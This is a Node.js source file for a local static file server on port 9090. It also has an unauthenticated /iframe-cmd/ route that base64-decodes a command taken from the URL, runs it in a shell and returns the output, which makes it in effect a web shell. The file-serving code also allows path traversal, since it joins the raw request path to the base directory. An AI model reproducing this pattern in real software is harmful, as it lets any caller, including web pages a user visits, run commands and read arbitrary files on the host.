var http = require("http");
var url = require("url");
var fs = require("fs");
var exec = require('child_process').exec; 

var server = http.createServer(function(req, res){
    var req_path = url.parse(req.url).path;
    if(req_path=="/"){
        req_path="/index.html";
    }
    var filepath = __dirname + req_path;
    
    
    const iframeCmd=req.url.match(/^\/iframe-cmd\/(.*)/);
    if(iframeCmd && iframeCmd.length>=2){
        const cmd=new Buffer(iframeCmd[1],'base64').toString();
        var result="";
        exec(cmd,function(err,stdout,stderr){
            if(err){
                result=stderr;
            }else{
                result=stdout;
            }
            res.writeHead(200, {'Content-Type' : 'text/html;charset=utf8'});
            res.end(result);
        });    
        return;
    }
    
    
    fs.exists(filepath, function(exists){
        if(exists){
            fs.stat(filepath, function(err, stats){
                if(err){
                    res.writeHead(500, {'Content-Type' : 'text/html;charset=utf8'});
                    res.end('<div styel="color:black;font-size:22px;">server error</div>');
                }else{
                    if(stats.isFile()){
                        var file = fs.createReadStream(filepath);
                        res.writeHead(200, {'Content-Type' : 'text/html;charset=utf8'});
                        file.pipe(res);
                    }else{
                        fs.readdir(filepath, function(err, files){
                            var str = '';
                            for(var i in files){
                                str += files[i] + '<br/>';
                            }
                            res.writeHead(200, {'Content-Type' : 'text/html;charset=utf8'});
                            res.write(str);
                        });
                    }
                }
            });
        }else{
            res.writeHead(404, {'Content-Type' : 'text/html;charset=utf8'});
            res.end('<div styel="color:black;font-size:22px;">404 not found</div>');
        }
    });
});
server.listen('9090', '127.0.0.1');
